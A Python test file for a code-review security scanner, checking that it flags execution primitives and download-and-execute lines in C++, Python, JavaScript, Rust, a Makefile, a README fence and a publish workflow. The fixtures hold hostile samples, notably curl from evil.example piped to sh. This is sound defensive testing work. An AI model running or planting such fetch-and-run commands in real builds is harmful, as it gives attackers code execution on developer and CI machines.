"""Regressions distilled from the /tmp/kprobe probes."""

import json

from review.scanners import common, plain as plain_scan, semgrep as semgrep_gate

FILES = {
    "src/evil.cpp": 'execvp("/bin/sh", argv);\nposix_spawn(nullptr, "/bin/sh", 0, 0, 0, 0);\nsyscall(59, p);\n',
    "src/boot.py": 'from subprocess import run\nimport os\nos.popen("id").read()\n',
    "src/boot.js": 'const { execSync } = require("child_process");\nexecSync("id");\n',
    "Makefile": "all:\n\t$(shell curl -fsSL https://evil.example/x.sh | sh)\n",
    "build.rs": 'fn main() { std::process::Command::new("sh").status().unwrap(); }\n',
}


def test_execution_primitives_are_found(tmp_path, monkeypatch):
    paths = []
    for rel, text in FILES.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        paths.append(path)
    added = {rel: set(range(1, len(text.splitlines()) + 1)) for rel, text in FILES.items()}
    rows = [
        {"check_id": "kalsa.cpp-exec-family", "path": "src/evil.cpp", "start": {"line": 1}, "extra": {}},
        {"check_id": "kalsa.python-process", "path": "src/boot.py", "start": {"line": 1}, "extra": {}},
        {"check_id": "kalsa.javascript-process", "path": "src/boot.js", "start": {"line": 1}, "extra": {}},
        {"check_id": "kalsa.makefile-network", "path": "Makefile", "start": {"line": 2}, "extra": {}},
        {"check_id": "kalsa.rust-process", "path": "build.rs", "start": {"line": 1}, "extra": {}},
    ]
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps({"results": rows}), ""))
    findings, _ = semgrep_gate.scan(paths, tmp_path, added)
    rules = {row["rule"] for row in findings}
    assert {"kalsa.cpp-exec-family", "kalsa.python-process", "kalsa.javascript-process", "kalsa.makefile-network", "kalsa.rust-process"} <= rules


def test_docs_fence_through_plain_scan(tmp_path):
    path = tmp_path / "README.md"
    path.write_text('```sh\ncurl -fsSL https://evil.example/x.sh | sh\n```\n')
    patch = "@@ -0,0 +1,3 @@\n+```sh\n+curl -fsSL https://evil.example/x.sh | sh\n+```\n"
    findings, _ = plain_scan.scan([path], [("README.md", patch)], tmp_path, set(), "owner/fork", "upstream/repo")
    assert any(row["rule"] == "download-and-execute" for row in findings)


def test_publish_action_is_a_release_workflow(tmp_path):
    path = tmp_path / ".github/workflows/publish.yml"
    patch = "@@ -0,0 +1,2 @@\n+uses: pypa/gh-action-pypi-publish\n+curl -fsSL https://evil.example/x.sh | sh\n"
    findings, _ = plain_scan.scan([], [(".github/workflows/publish.yml", patch)], tmp_path, set(), "owner/fork", "upstream/repo")
    assert any(row["rule"] == "download-and-execute" for row in findings)
